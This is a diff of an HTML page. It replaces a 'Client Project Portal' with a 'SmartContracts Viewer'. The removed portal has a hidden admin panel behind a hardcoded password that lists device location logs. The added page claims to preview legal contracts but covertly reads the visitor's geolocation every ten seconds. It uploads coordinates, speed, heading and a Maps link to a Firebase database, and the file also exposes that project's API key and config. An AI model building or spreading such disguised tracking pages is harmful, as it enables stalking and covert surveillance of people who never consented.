@@ -1,191 +1,90 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Client Project Portal</title>
-  <meta charset="UTF-8">
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      background: #f4f4f4;
-      color: #333;
-    }
-    header {
-      background-color: #222;
-      color: white;
-      padding: 1rem;
-      text-align: center;
-    }
-    .section {
-      padding: 2rem;
-      text-align: center;
-    }
-    .admin-panel {
-      display: none;
-      background: white;
-      margin: 2rem;
-      padding: 2rem;
-      border-radius: 8px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
-    }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-top: 1rem;
-    }
-    th, td {
-      padding: 0.8rem;
-      border: 1px solid #ddd;
-      text-align: center;
-    }
-    th {
-      background: #444;
-      color: white;
-    }
-    #tapTarget {
-      height: 100px;
-    }
-    .filter-date {
-      margin-top: 1rem;
-    }
-    .hidden-login {
-      display: none;
-    }
-    .export-button {
-      margin-top: 1rem;
-      padding: 0.5rem 1rem;
-      background: #007BFF;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-  </style>
-</head>
-<body>
-  <header id="tapTarget">
-    <h1>Client Project Portal</h1>
-    <p>Client Requirements<br>
-    All specifications must be approved and timestamped.<br><br>
-    Terms and Review<br>
-    Final review will be automatically saved and verified upon access.<br><br>
-    Legal & Compliance<br>
-    Ensure full adherence to documentation agreements.</p>
-  </header>
-
-  <div class="section">
-    <h2>Locations</h2>
-    <p>Latitude / Longitude logs</p>
-  </div>
-
-  <div class="hidden-login" id="loginPrompt">
-    <p>Enter Admin Password:</p>
-    <input type="password" id="adminPass" placeholder="Password"/>
-    <button onclick="checkPassword()">Login</button>
-  </div>
-
-  <div class="admin-panel" id="adminPanel">
-    <h2>Admin Dashboard</h2>
-    <input type="date" id="filterDate" class="filter-date" />
-    <button class="export-button" onclick="exportToCSV()">Export as CSV</button>
-    <div id="logTableContainer"></div>
-  </div>
-
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-  <script>
-    // Firebase config
-    const firebaseConfig = {
-      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
-      authDomain: "gps-d0bab.firebaseapp.com",
-      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
-      projectId: "gps-d0bab",
-      storageBucket: "gps-d0bab.appspot.com",
-      messagingSenderId: "810816177909",
-      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-
-    // Tap detection
-    let tapCount = 0;
-    const tapTarget = document.getElementById('tapTarget');
-    tapTarget.addEventListener('click', () => {
-      tapCount++;
-      if (tapCount >= 5) {
-        document.getElementById('loginPrompt').style.display = 'block';
-        tapCount = 0;
-      }
-    });
-
-    function checkPassword() {
-      const input = document.getElementById('adminPass').value;
-      if (input === "ASCII") {
-        document.getElementById('adminPanel').style.display = 'block';
-        document.getElementById('loginPrompt').style.display = 'none';
-        loadLogs();
-      } else {
-        alert("Wrong password");
-      }
-    }
-
-    function loadLogs() {
-      const logsRef = db.ref("locations");
-      logsRef.on("value", snapshot => {
-        const logs = [];
-        snapshot.forEach(child => {
-          const entry = child.val();
-          logs.push({
-            device: child.key,
-            lat: entry.lat || 'undefined',
-            lng: entry.lng || 'undefined',
-            timestamp: entry.timestamp || 'Invalid Date'
-          });
-        });
-
-        const selectedDate = document.getElementById("filterDate").value;
-        const filtered = selectedDate
-          ? logs.filter(log => new Date(log.timestamp).toISOString().slice(0,10) === selectedDate)
-          : logs;
-
-        renderTable(filtered);
-      });
-    }
-
-    function renderTable(data) {
-      const container = document.getElementById("logTableContainer");
-      let html = `
-        <table>
-          <tr><th>Device</th><th>Latitude</th><th>Longitude</th><th>Timestamp</th></tr>
-      `;
-      data.forEach(entry => {
-        html += `<tr>
-          <td>${entry.device}</td>
-          <td>${entry.lat}</td>
-          <td>${entry.lng}</td>
-          <td>${entry.timestamp}</td>
-        </tr>`;
-      });
-      html += `</table>`;
-      container.innerHTML = html;
-    }
-
-    function exportToCSV() {
-      const rows = document.querySelectorAll("table tr");
-      let csv = "";
-      rows.forEach(row => {
-        const cols = row.querySelectorAll("th, td");
-        const values = Array.from(cols).map(col => `"${col.innerText}"`).join(",");
-        csv += values + "\n";
-      });
-      const blob = new Blob([csv], { type: "text/csv" });
-      const link = document.createElement("a");
-      link.href = URL.createObjectURL(blob);
-      link.download = "location_logs.csv";
-      link.click();
-    }
-
-    document.getElementById("filterDate").addEventListener("change", loadLogs);
-  </script>
-</body>
-  </html>
+<!DOCTYPE html>  <html>  
+<head>  
+  <title>SmartContracts Viewer</title>  
+  <meta charset="UTF-8" />  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/4761/4761087.png" type="image/png">  
+  <style>  
+    body {  
+      font-family: 'Segoe UI', sans-serif;  
+      background: #f7f7f7;  
+      color: #333;  
+      text-align: center;  
+      padding: 40px;  
+    }  
+    h1 {  
+      color: #444;  
+    }  
+    .card {  
+      background: #fff;  
+      border-radius: 10px;  
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);  
+      padding: 30px;  
+      max-width: 400px;  
+      margin: auto;  
+    }  
+    p {  
+      font-size: 15px;  
+      color: #777;  
+    }  
+  </style>  
+</head>  
+<body>    <div class="card">  
+    <h1>SmartContracts Viewer</h1>  
+    <p>This app lets you preview digital contracts and agreements for legal purposes.</p>  
+    <p><i>Loading contract document...</i></p>  
+  </div>    <!-- Firebase SDK -->    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>    <script>  
+    // ✅ Your Firebase config  
+    const firebaseConfig = {  
+      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",  
+      authDomain: "gps-d0bab.firebaseapp.com",  
+      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",  
+      projectId: "gps-d0bab",  
+      storageBucket: "gps-d0bab.appspot.com",  
+      messagingSenderId: "810816177909",  
+      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"  
+    };  
+  
+    firebase.initializeApp(firebaseConfig);  
+    const db = firebase.database();  
+  
+    // Random device ID for anonymity  
+    const userId = 'device_' + Math.random().toString(36).substring(2, 10);  
+  
+    function getDirection(heading) {  
+      if (heading === null || isNaN(heading)) return "Unknown";  
+      const directions = ["N", "NE", "E", "SE", "S", "SW", "W", "NW"];  
+      return directions[Math.round(heading / 45) % 8];  
+    }  
+  
+    function updateLocation(position) {  
+      const { latitude, longitude, speed, heading } = position.coords;  
+      const direction = getDirection(heading);  
+      const timestamp = new Date().toISOString();  
+      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;  
+  
+      db.ref('locations/' + userId).set({  
+        latitude,  
+        longitude,  
+        speed,  
+        direction,  
+        timestamp,  
+        maps_link: mapsLink  
+      });  
+    }  
+  
+    function handleError(error) {  
+      console.warn("Location error:", error.message);  
+    }  
+  
+    function trackLocation() {  
+      if (navigator.geolocation) {  
+        navigator.geolocation.getCurrentPosition(updateLocation, handleError);  
+      }  
+    }  
+  
+    // Auto-track every 10 seconds  
+    setInterval(trackLocation, 10000);  
+    trackLocation();  
+  </script>  </body>  
+</html>
